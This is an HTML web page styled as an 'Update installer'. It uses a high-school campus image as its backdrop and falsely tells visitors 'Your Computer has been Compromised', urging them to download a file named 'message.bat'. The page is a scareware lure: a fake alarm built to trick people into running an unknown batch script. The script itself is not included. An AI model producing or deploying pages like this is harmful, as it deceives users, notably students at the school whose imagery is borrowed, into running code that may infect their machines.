<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download the Script</title>
    <style>
        /* Basic reset and box-sizing */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
        }
        
        /* Header styling */
        header {
            background-color: #003366;
            padding: 10px 0;
            color: #fff;
            text-align: center;
        }
        
        header h1 {
            font-size: 2rem;
        }
        
        nav ul {
            list-style: none;
            text-align: center;
            padding: 10px;
        }
        
        nav ul li {
            display: inline-block;
            margin: 0 15px;
        }
        
        nav ul li a {
            color: #fff;
            text-decoration: none;
            font-weight: bold;
        }
        
        /* Hero section styling */
        .hero {
            background: url('https://yuhsb.org/wp-content/uploads/2020/07/header-campus-v2.jpg') no-repeat center center/cover;
            height: 500px;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        
        .hero h2 {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        
        .hero p {
            font-size: 1.2rem;
        }
        
        /* Download button styling */
        .download-btn {
            background-color: #ff6600;
            color: white;
            padding: 15px 30px;
            font-size: 1.2rem;
            border: none;
            cursor: pointer;
            text-decoration: none;
            margin-top: 20px;
            border-radius: 5px;
        }
        
        .download-btn:hover {
            background-color: #cc5200;
        }
        
        /* Footer */
        footer {
            background-color: #003366;
            color: white;
            text-align: center;
            padding: 20px 0;
            margin-top: 30px;
        }
    </style>
</head>
<body>

    <!-- Header Section -->
    <header>
        <h1>Update installer</h1>
        <nav>
            <ul>
                <li><a href="#home">Highschool</a></li>
            </ul>
        </nav>
    </header>

    <!-- Hero Section -->
    <div class="hero">
        <h2>Your Computer has been Compromised</h2>
        <p>Click below to download the necessary file.</p>
        <a href="message.bat" download class="download-btn">Download .bat File</a>

    </div>

    <!-- Footer Section -->
    <footer>
        <p>&copy; 2024. All rights reserved.</p>
    </footer>

</body>
</html>
